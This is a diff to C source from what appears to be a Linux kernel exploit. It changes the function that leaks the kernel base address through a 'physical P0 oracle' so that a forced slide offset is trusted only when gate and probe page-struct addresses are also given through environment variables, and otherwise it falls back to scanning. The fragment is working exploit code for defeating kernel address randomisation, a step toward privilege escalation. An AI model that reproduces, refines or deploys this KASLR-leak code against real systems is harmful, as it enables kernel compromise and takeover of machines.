@@ -927,7 +927,11 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
-  if (forced_offset_arg && *forced_offset_arg) {
+  const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
+  const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
+  if (forced_offset_arg && *forced_offset_arg &&
+      gate_page_arg && *gate_page_arg &&
+      probe_page_arg && *probe_page_arg) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
@@ -936,25 +940,25 @@ int slide_leak_kernel_base(void) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
-    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
-    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
-    if (gate_page_arg && probe_page_arg) {
-      char *gate_end = NULL;
-      char *probe_end = NULL;
-      errno = 0;
-      p0_gate_page_struct = (uintptr_t)strtoull(
-          gate_page_arg, &gate_end, 0);
-      p0_probe_page_struct = (uintptr_t)strtoull(
-          probe_page_arg, &probe_end, 0);
-      if (errno || gate_end == gate_page_arg || *gate_end ||
-          probe_end == probe_page_arg || *probe_end) {
-        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
-                 gate_page_arg, probe_page_arg);
-        return 0;
-      }
+    char *gate_end = NULL;
+    char *probe_end = NULL;
+    errno = 0;
+    p0_gate_page_struct = (uintptr_t)strtoull(
+        gate_page_arg, &gate_end, 0);
+    p0_probe_page_struct = (uintptr_t)strtoull(
+        probe_page_arg, &probe_end, 0);
+    if (errno || gate_end == gate_page_arg || *gate_end ||
+        probe_end == probe_page_arg || *probe_end) {
+      pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
+               gate_page_arg, probe_page_arg);
+      return 0;
     }
     pr_info("slide forced p0 offset=%08llx\n", value);
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+  }
+  if (forced_offset_arg && *forced_offset_arg) {
+    pr_info("slide ignored cached p0 offset=%s without gate/probe refs; scanning\n",
+            forced_offset_arg);
   }
   return slide_leak_physical_base();
 #else
